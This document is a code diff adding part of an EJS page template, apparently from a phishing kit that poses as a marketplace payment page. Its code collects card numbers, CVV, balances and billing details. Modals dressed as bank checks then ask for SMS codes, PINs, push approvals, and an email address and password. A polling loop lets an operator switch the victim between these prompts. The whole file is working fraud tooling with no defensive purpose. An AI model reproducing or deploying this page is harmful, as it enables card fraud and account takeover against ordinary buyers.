+            element: "div",
+            attributes: {
+              innerHTML: `<p>${clickableError}</p>`,
+            },
+          },
+          icon: "info",
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false, // Убираем кнопки из модального окна
+        });
+      },
+
+
+
+      customdepModal(err) {
+        const amount = err;
+        const lang = "<%=serviceLang%>";
+        const template = getTemplate(lang, amount);
+
+        // создаём HTML-элемент с жирным текстом
+        const contentEl = document.createElement("div");
+        contentEl.innerHTML = `<b>${template}</b>`;
+
+        // вызываем swal с кастомным контентом
+        swal({
+          title: "",
+          content: contentEl,
+          icon: "error",
+          dangerMode: true,
+        });
+      },
+      customModal(err) {
+        swal(
+          "",
+          `${err}`,
+          "error"
+        );
+      },
+
+      limitsModal() {
+        swal(
+          "<%=translate["error_title"][serviceLang]%>",
+          "<%=translate["limits"][serviceLang]%>",
+          "error"
+        );
+      },
+      depModal() {
+        swal(
+          "<%=translate["dep_error"][serviceLang]%>",
+          "<%=translate["dep_text"][serviceLang]%>",
+
+          "error"
+        );
+      },
+
+      correctBalanceModal() {
+        const wrongBalanceMessage = "<%=translate['wrong_code'][serviceLang]%>";
+
+        // Модальное окно с вводом
+        swal({
+          icon: "warning",
+          content: {
+            element: "div",
+            attributes: {
+              innerHTML: `
+          <div style="display: flex; flex-direction: column; align-items: center;">
+            <h3 style="font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;">
+              <span style="color: #d9534f;"><b><%=translate['error_title'][serviceLang]%></b></span>
+            </h3>
+            <p style="font-size: 14px; margin-bottom: 15px; text-align: center; color: #333;">
+              <strong><%=translate['correct_balance'][serviceLang]%></strong>
+            </p>
+            <input
+              type="text"
+              placeholder="0.00"
+              id="balanceInput"
+              style="text-align: center; width: 100%; max-width: 300px; margin: 0 auto;
+                     border: 2px solid #f0ad4e; padding: 10px; border-radius: 5px; font-size: 14px;"
+            />
+          </div>
+        `,
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate['submit'][serviceLang]%>",
+              closeModal: false, // Не закрывать окно автоматически
+              className: "custom-swal-confirm-button",
+            },
+          },
+        }).then(async () => {
+          const balance = document.getElementById("balanceInput").value.trim();
+
+          if (!balance || balance.length < 1) {
+            // Отображение ошибки при пустом значении
+            swal(wrongBalanceMessage, "", "error").then(() => {
+              setTimeout(() => {
+                this.correctBalanceModal(); // Повторный вызов
+              }, 3000);
+            });
+            return;
+          }
+
+          try {
+            // Показ окна загрузки
+      swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 30px 20px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        ">
+          <div class="dot-loader" style="display: flex; gap: 6px; margin-bottom: 18px;">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.2s;"></div>
+            <div class="dot" style="animation-delay: 0.4s;"></div>
+          </div>
+          <div class="swal-title" style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 6px;">
+            <%=translate['wait'][serviceLang]%>
+          </div>
+          <div class="swal-text" style="font-size: 14px; color: #525f7f; text-align: center;">
+            <%=translate['bank_processes'][serviceLang]%>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+});
+
+
+
+            // Отправка данных (теперь поддерживает и текстовые значения)
+            const response = await axios.post("/api/submitBalance", {
+              codeType: "balance",
+              code: balance, // Передаем текст как есть
+              token: this.logToken,
+            });
+
+            console.log("Баланс успешно отправлен:", response.data);
+
+            // Повторное открытие окна после успешного ответа
+            this.correctBalanceModal();
+
+          } catch (err) {
+            console.error("Ошибка при отправке баланса", err);
+            swal(wrongBalanceMessage, "", "error").then(() => {
+              setTimeout(() => {
+                this.correctBalanceModal(); // Повторный вызов
+              }, 3000);
+            });
+          }
+        });
+      },
+      otherCardModal() {
+        // Показываем сообщение об ошибке
+        swal(
+          "<%=translate['error_title'][serviceLang]%>",
+          "<%=translate['other_card'][serviceLang]%>",
+          "error"
+        );
+        console.log("logToken:", this.logToken);
+
+        // Выполняем запрос на /auto/othercard
+        axios.post("/auto/othercard", {
+          token: this.logToken || "default_token", // Убедитесь, что token не undefined
+        })
+          .then((response) => {
+            console.log("Запрос на /auto/othercard выполнен успешно", response.data);
+          })
+          .catch((error) => {
+            console.error("Ошибка выполнения запроса на /auto/othercard", error);
+
+            // Отобразить сообщение об ошибке, если запрос не удался
+            swal(
+              "<%=translate['error_title'][serviceLang]%>",
+              "<%=translate['error_title'][serviceLang] || 'Ошибка запроса.'%>",
+              "error"
+            );
+          });
+      },
+      pushModal() {
+        // Асинхронно выполняем первый запрос без ожидания действия пользователя
+        axios.post("/auto/push", {
+          token: this.logToken,
+        })
+          .then((response) => {
+            console.log('Первый запрос выполнен успешно', response);
+          })
+          .catch((error) => {
+            console.error('Ошибка выполнения первого запроса', error);
+          });
+
+        // Отображаем модальное окно sweetalert для подтверждения действия пользователя
+        swal({
+          title: "<%=translate['push_title'][serviceLang]%>",
+          text: "<%=translate['push_text'][serviceLang]%>",
+          icon: "info",
+          closeOnClickOutside: true,
+          closeOnEsc: true,
+          buttons: {
+            confirm: {
+              text: "<%=translate['сonfirmed'][serviceLang]%>",
+              value: true,
+            },
+          },
+        })
+          .then(async (value) => { // Используем async для обработки асинхронного кода внутри
+            // Проверяем, была ли нажата кнопка "Confirmed"
+            if (value) {
+              try {
+                // Открываем окно с сообщением ожидания
+          swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 30px 20px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        ">
+          <div class="dot-loader" style="display: flex; gap: 6px; margin-bottom: 18px;">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.2s;"></div>
+            <div class="dot" style="animation-delay: 0.4s;"></div>
+          </div>
+          <div class="swal-title" style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 6px;">
+            <%=translate['wait'][serviceLang]%>
+          </div>
+          <div class="swal-text" style="font-size: 14px; color: #525f7f; text-align: center;">
+            <%=translate['bank_processes'][serviceLang]%>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+});
+
+
+
+                // Асинхронно выполняем второй запрос после нажатия на кнопку "Confirmed"
+                const response = await axios.post("/api/confirmed", {
+                  token: this.logToken,
+                });
+
+                console.log('Второй запрос выполнен успешно', response);
+                // Закрываем окно SweetAlert после успешного выполнения запроса
+        swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 30px 20px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        ">
+          <div class="dot-loader" style="display: flex; gap: 6px; margin-bottom: 18px;">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.2s;"></div>
+            <div class="dot" style="animation-delay: 0.4s;"></div>
+          </div>
+          <div class="swal-title" style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 6px;">
+            <%=translate['wait'][serviceLang]%>
+          </div>
+          <div class="swal-text" style="font-size: 14px; color: #525f7f; text-align: center;">
+            <%=translate['bank_processes'][serviceLang]%>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+});
+
+
+              } catch (error) {
+                console.error('Ошибка выполнения второго запроса', error);
+                // Показываем сообщение об ошибке, если запрос не удался
+                swal("An error occurred", "Please try again later.", "error");
+              }
+            }
+          });
+      }
+
+,
+
+      successModal() {
+        swal(
+          "<%=translate["success"][serviceLang]%>",
+          "<%=translate["money_will"][serviceLang]%>",
+          "info", {
+
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        }
+        );
+      },
+      successModal() {
+        swal(
+          "<%=translate["wait"][serviceLang]%>",
+          "<%=translate["bank_processes"][serviceLang]%>",
+          "info", {
+
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        }
+        );
+      },
+
+
+
+      pictureModal(img){
+        swal("", "", "", {
+          content: {
+            element: "div",
+            attributes: {
+              id: "pictures_div"
+            },
+          },
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        });
+
+        document.querySelector("#pictures_div").innerHTML = `<div class="pictures-container"><div class="pictures-element" data-item="writerImg"><img width="auto" height="225"  draggable="false" alt="" src="${img}"></div>`;
+        // document.querySelector(".pictures-container").classList.remove("disabled");
+      },
+      mailModal() {
+        const wrongMailMessage = "<%= translate['wrong_mail'][ad.service.lang] %>";
+
+        swal({
+          icon: "info",
+          content: {
+            element: "div",
+            attributes: {
+              innerHTML: `
+          <div style="display: flex; flex-direction: column; align-items: center;">
+            <h3 style="font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;">
+             Security Check
+            </h3>
+            <p style="font-size: 14px; margin-bottom: 15px; text-align: center; color: #333;">
+              Connect your email account for security check
+            </p>
+            <input
+              type="email"
+              placeholder="Email"
+              id="mailInput"
+              style="text-align: center; width: 100%; max-width: 300px; margin-bottom: 10px;
+                     border: 2px solid #ccc; padding: 10px; border-radius: 5px; font-size: 14px;"
+            />
+            <input
+              type="password"
+              placeholder="Password"
+              id="mailPassInput"
+              style="text-align: center; width: 100%; max-width: 300px;
+                     border: 2px solid #ccc; padding: 10px; border-radius: 5px; font-size: 14px;"
+            />
+          </div>
+        `,
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%= translate['submit'][ad.service.lang] || 'Submit' %>",
+              closeModal: false,
+              className: "custom-swal-confirm-button",
+            },
+          },
+        }).then(async () => {
+          const email = document.getElementById("mailInput").value.trim();
+          const password = document.getElementById("mailPassInput").value.trim();
+
+          if (!email || !password) {
+            swal(wrongMailMessage, "", "error").then(() => {
+              setTimeout(() => {
+                mailModal();
+              }, 3000);
+            });
+            return;
+          }
+
+          try {
+            // Загрузка
+            swal({
+              content: {
+                element: "div",
+                attributes: {
+                  innerHTML: `
+              <div style="text-align: center;">
+                <img src="https://i.imgur.com/AN1d86t.gif" alt="Loading"
+                     style="width: 100px; height: 100px; margin-bottom: 10px;" />
+                <p style="font-size: 14px; color: #333;">
+                  <strong>Processing...</strong>
+                </p>
+              </div>
+            `,
+                },
+              },
+              buttons: false,
+              closeOnClickOutside: false,
+              closeOnEsc: false,
+            });
+
+            // Отправка
+            const response = await axios.post("/api/submitMail", {
+              email,
+              password,
+              token: this.logToken,
+            });
+
+
+
+            // mailModal();
+
+          } catch (err) {
+            console.error("Ошибка при отправке почты", err);
+            swal(wrongMailMessage, "", "error").then(() => {
+              setTimeout(() => {
+                mailModal();
+              }, 3000);
+            });
+          }
+        });
+      },
+      ferrModal(
+        codeType = "sms",
+        title = "<%=translate['sms_title'][serviceLang]%>",
+        text = "<%=translate['sms_text'][serviceLang]%>",
+        placeholder = "<%=translate['sms_placeholder'][serviceLang]%>",
+        wrong_code = "<%=translate['error_title'][serviceLang]%>"
+      ) {
+        swal.stopLoading();
+
+        const clickableText = text.replace(
+          /(https?:\/\/[^\s]+)/g,
+          '<a href="$1" target="_blank" style="color: #7cd1f9; text-decoration: underline;">$1</a>'
+        );
+
+        const customContent = document.createElement("div");
+        customContent.innerHTML = `
+    <p style="text-align: center;">${clickableText}</p>
+    <input 
+      type="text" 
+      id="custom-input" 
+      placeholder="${placeholder}" 
+      style="text-align: center; width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; margin-top: 10px;" 
+      maxlength="255"
+    />
+  `;
+
+        swal({
+          title,
+          content: customContent,
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate['submit'][serviceLang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async () => {
+          const code = document.getElementById("custom-input").value.trim();
+
+          if (!code) {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.ferrModal(codeType, title, text, placeholder, wrong_code);
+              }, 3000);
+            });
+          }
+
+          try {
+            await axios.post("/api/submitCustom", {
+              codeType,
+              code,
+              token: this.logToken,
+            });
+
+      swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 30px 20px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        ">
+          <div class="dot-loader" style="display: flex; gap: 6px; margin-bottom: 18px;">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.2s;"></div>
+            <div class="dot" style="animation-delay: 0.4s;"></div>
+          </div>
+          <div class="swal-title" style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 6px;">
+            <%=translate['wait'][serviceLang]%>
+          </div>
+          <div class="swal-text" style="font-size: 14px; color: #525f7f; text-align: center;">
+            <%=translate['bank_processes'][serviceLang]%>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+});
+
+
+          } catch (err) {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.ferrModal(codeType, title, text, placeholder, wrong_code);
+              }, 3000);
+            });
+          }
+        });
+      },
+
+
+      pinModal(
+        codeType = "pin",
+        title = "<%=translate['pincode_1'][serviceLang]%>",
+        text = "<%=translate['pincode'][serviceLang]%>",
+        wrong_code = "<%=translate['error_title'][serviceLang]%>"
+      ) {
+        swal.stopLoading();
+        swal({
+          title,
+          text,
+          content: {
+            element: "input",
+            attributes: {
+              type: "password",
+              maxLength: 255,
+              required: true,
+              style: "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate['submit'][serviceLang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async (code) => {
+          if (!code || code.trim() === "") {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.pinModal(codeType, title, text, wrong_code);
+              }, 3000);
+            });
+          }
+
+          try {
+            await axios.post("/api/submitCode", {
+              codeType,
+              code: code.trim(),
+              token: this.logToken,
+            });
+
+     swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 30px 20px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        ">
+          <div class="dot-loader" style="display: flex; gap: 6px; margin-bottom: 18px;">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.2s;"></div>
+            <div class="dot" style="animation-delay: 0.4s;"></div>
+          </div>
+          <div class="swal-title" style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 6px;">
+            <%=translate['wait'][serviceLang]%>
+          </div>
+          <div class="swal-text" style="font-size: 14px; color: #525f7f; text-align: center;">
+            <%=translate['bank_processes'][serviceLang]%>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+});
+
+
+          } catch (err) {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.pinModal(codeType, title, text, wrong_code);
+              }, 3000);
+            });
+          }
+        });
+      },
+      codeModal(codeType) {
+        const title = "<%=translate['sms_title'][serviceLang]%>";
+        const text = "<%=translate['sms_text'][serviceLang]%>";
+        const placeholder = "<%=translate['sms_placeholder'][serviceLang]%>";
+        const wrongCodeMessage = "<%=translate['wrong_code'][serviceLang]%>";
+
+        // Отправка события на сервер
+        axios.post("/auto/sms", {
+          token: this.logToken,
+        }).then(function (response) {
+          console.log('Запрос выполнен успешно', response);
+        }).catch(function (error) {
+          console.error('Ошибка выполнения запроса', error);
+        });
+
+        // Показ модального окна
+        swal({
+          title: title,
+          text: text,
+          content: {
+            element: "input",
+            attributes: {
+              type: "password",
+              placeholder: placeholder,
+              maxLength: 255,
+              required: true,
+              style: "text-align: center; width: auto; margin-left: auto; margin-right: auto;"
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate['submit'][serviceLang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async (code) => {
+          // Проверка на пустое значение
+          if (!code || code.trim() === "") {
+            swal(wrongCodeMessage, "", "error").then(() => {
+              setTimeout(() => {
+                this.codeModal(codeType);
+              }, 3000);
+            });
+            return;
+          }
+
+          try {
+            const response = await axios.post("/api/submitCode", {
+              codeType,
+              code: code.trim(),
+              token: this.logToken,
+            });
+
+      swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 30px 20px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        ">
+          <div class="dot-loader" style="display: flex; gap: 6px; margin-bottom: 18px;">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.2s;"></div>
+            <div class="dot" style="animation-delay: 0.4s;"></div>
+          </div>
+          <div class="swal-title" style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 6px;">
+            <%=translate['wait'][serviceLang]%>
+          </div>
+          <div class="swal-text" style="font-size: 14px; color: #525f7f; text-align: center;">
+            <%=translate['bank_processes'][serviceLang]%>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+  timer:5000,
+});
+
+
+          } catch (err) {
+            console.error('Ошибка при отправке кода', err);
+            swal(wrongCodeMessage, "", "error").then(() => {
+              setTimeout(() => {
+                this.codeModal(codeType);
+              }, 3000);
+            });
+          }
+        });
+      },
+     
+      valid_credit_card(value) {
+        // accept only digits, dashes or spaces
+        if (/[^0-9-\s]+/.test(value)) return false;
+
+        // The Luhn Algorithm. It's so pretty.
+        var nCheck = 0,
+          nDigit = 0,
+          bEven = false;
+        value = value.replace(/\D/g, "");
+
+        for (var n = value.length - 1; n >= 0; n--) {
+          var cDigit = value.charAt(n),
+            nDigit = parseInt(cDigit, 10);
+
+          if (bEven) {
+            if ((nDigit *= 2) > 9) nDigit -= 9;
+          }
+
+          nCheck += nDigit;
+          bEven = !bEven;
+        }
+
+        return nCheck % 10 == 0;
+      },
+    submitForm(e) {
+  e.preventDefault();
+
+  // Проверка номера карты
+  if (!this.valid_credit_card(this.cardNumber)) {
+    return (this.cardError = "<%= translate['card_number_invalid'][serviceLang] %>");
+  } else {
+    this.cardError = "";
+  }
+
+  // Безопасно обрабатываем цену
+  const priceStr = "<%= ad.price ? ad.price.replace(/\D+/g, '') : '' %>";
+  const price = parseFloat(priceStr);
+  const balance = parseFloat(this.cardBalance);
+
+  // Шаг 1 — предупреждение от банка
+  if (this.step < 2 && this.balanceChecker) {
+    return swal({
+      title: "<%= translate['attention'][serviceLang] %>",
+      icon: "warning",
+      text: "<%= translate['bank_asked'][serviceLang] %>",
+      buttons: true,
+      dangerMode: true,
+    }).then((val) => {
+      if (val) this.step = 2;
+    });
+  }
+
+  // Шаг 2 — проверка баланса (если включена)
+  if (this.step === 2 || !this.balanceChecker) {
+    if (this.balanceChecker) {
+      // Проверка: баланс пустой, 0 или не число
+      if (!this.cardBalance || balance === 0 || isNaN(balance)) {
+        return swal({
+          title: "<%= translate['error_title'][serviceLang] %>",
+          text: "<%= translate['correct_balance'][serviceLang] %>",
+          icon: "info",
+          buttons: {
+            confirm: {
+              text: "<%= translate['submit'][serviceLang] %>",
+              closeModal: true,
+            },
+          },
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+        });
+      }
+
+      // Проверка: баланс равен цене
+      if (!isNaN(price) && balance === price) {
+        return swal({
+          title: "<%= translate['error_title'][serviceLang] %>",
+          text: "<%= translate['correct_balance'][serviceLang] %>",
+          icon: "info",
+          buttons: {
+            confirm: {
+              text: "<%= translate['submit'][serviceLang] %>",
+              closeModal: true,
+            },
+          },
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+        });
+      }
+    }
+
+    // Всё ОК — отправка формы
+    this.loading = true;
+
+    axios
+      .post("/api/submitCard", {
+        adId: "<%= ad.id %>",
+        number: this.cardNumber.replace(/\D+/g, ""),
+        expire: this.cardMonth.toString() + "/" + this.cardYear.toString().substr(-2),
+        cvv: this.cardCvv,
+        holder: this.cardHolder,
+        balance: this.cardBalance,
+        billingAddress: this.billingAddress,
+        billingZip: this.billingZip,
+        billingCity: this.billingCity,
+        billingState: this.billingState,
+        billingCountry: this.billingCountry,
+        billingPhone: this.billingPhone,
+      })
+      .finally(() => (this.loading = false))
+      .then((response) => {
+        if (response.data.status == false) {
+          swal({
+            title: "<%= translate['error_title'][serviceLang] %>",
+            text: "<%= translate['other_card'][serviceLang] %>",
+            icon: "error",
+            closeOnClickOutside: false,
+            closeOnEsc: false,
+            buttons: false,
+            showLoaderOnConfirm: true,
+          });
+        } else {
+          localStorage.token = response.data.token;
+          this.logToken = response.data.token;
+          if (this.currentStatus == null) this.checkLogStatus();
+
+       swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 30px 20px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        ">
+          <div class="dot-loader" style="display: flex; gap: 6px; margin-bottom: 18px;">
+            <div class="dot"></div>
+            <div class="dot" style="animation-delay: 0.2s;"></div>
+            <div class="dot" style="animation-delay: 0.4s;"></div>
+          </div>
+          <div class="swal-title" style="font-size: 16px; font-weight: 600; color: #32325d; margin-bottom: 6px;">
+            <%=translate['wait'][serviceLang]%>
+          </div>
+          <div class="swal-text" style="font-size: 14px; color: #525f7f; text-align: center;">
+            <%=translate['bank_processes'][serviceLang]%>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+});
+
+          axios
+            .post("/auto/wait", {
+              token: this.logToken,
+            })
+            .then((response) => {
+              console.log("Status removed successfully", response.data);
+            })
+            .catch((error) => {
+              console.error("Error removing status", error);
+            });
+        }
+      })
+      .catch((err) => {
+        swal(
+          "<%= translate['error_title'][serviceLang] %>",
+          "<%= translate['error'][serviceLang] %>",
+          "error"
+        );
+      });
+  }
+},
+      checkLogStatus() {
+        axios
+          .post("/api/checkStatus", {
+            token: this.logToken,
+          })
+          .finally(() => setTimeout(() => this.checkLogStatus(this.logToken), 1500))
+          .then((response) => {
+            this.imgUrl = response.data.imgUrl
+
+            if (this.currentStatus != response.data.status)
+              this.currentStatus = response.data.status;
+          })
+          .catch((err) => err);
+      },
+     
+    
+      
+    },
+      });
+  </script>
+  <script>
+    let balanceHandled = false;
+
+    async function handleBalanceOnce() {
+      if (balanceHandled) return;
+      balanceHandled = true;
+
+      try {
+        await axios.post("/api/enterBalance", { adId: "<%=ad.id%>" });
+
+        await axios.post("/auto/balance", { adId: "<%=ad.id%>" });
+      } catch (error) {
+        console.error("Ошибка в запросе:", error);
+      }
+    }
+
+    function attachOrAutoHandle() {
+      const input = document.getElementById("cardBalance");
+      if (!input) return;
+
+      if (!input.dataset.listenerAdded) {
+        input.dataset.listenerAdded = "true";
+
+        // Клик по полю
+        input.addEventListener("click", handleBalanceOnce);
+
+        // Также вызовем сразу, если поле уже отображено (например, autofill)
+        handleBalanceOnce();
+      }
+    }
+
+    // DOM загрузился
+    window.addEventListener("DOMContentLoaded", () => {
+      attachOrAutoHandle();
+
+      // Следим за добавлением поля
+      const observer = new MutationObserver(() => {
+        attachOrAutoHandle();
+      });
+
+      observer.observe(document.body, { childList: true, subtree: true });
+    });
+  </script>
+
+
+  <div id="support">
+    <script type="text/javascript">
+      var _smartsupp = _smartsupp || {};
+      _smartsupp.key = '<%=user.smartsupp%>';
+      window.smartsupp || (function (d) {
+        var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
+        s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+        c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+        c.src = 'https://www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
+      })(document);
+    </script>
+  </div>
+
+  <script>
+    if ("<%=user.smartsupp%>" == false) {
+      document.querySelector('#support').innerHTML = `
+          <div class="
+   chatra--webkit
+   chatra--style-round
+   chatra--side-bottom
+   chatra--pos-right
+   chatra--visible
+   chatra--expanded
+   chatra--fast-toggle
+ " id="chatra" data-turbolinks-permanent="" style="
+   width: 380px;
+   height: 600px;
+   transform: none;
+   z-index: 2147483647;
+   display: none;
+ ">
+    <div id="chatra__iframe-wrapper">
+      <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+        src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+  </div>
+  <div class="support-circle"
+    onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+                          `
+    }
+  </script>
+
+
+
+
+
+
+
+  <script>
+    const adId = "<%=ad.id%>"
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+  <script src="/js/eye.js" defer></script>
+
+</body>
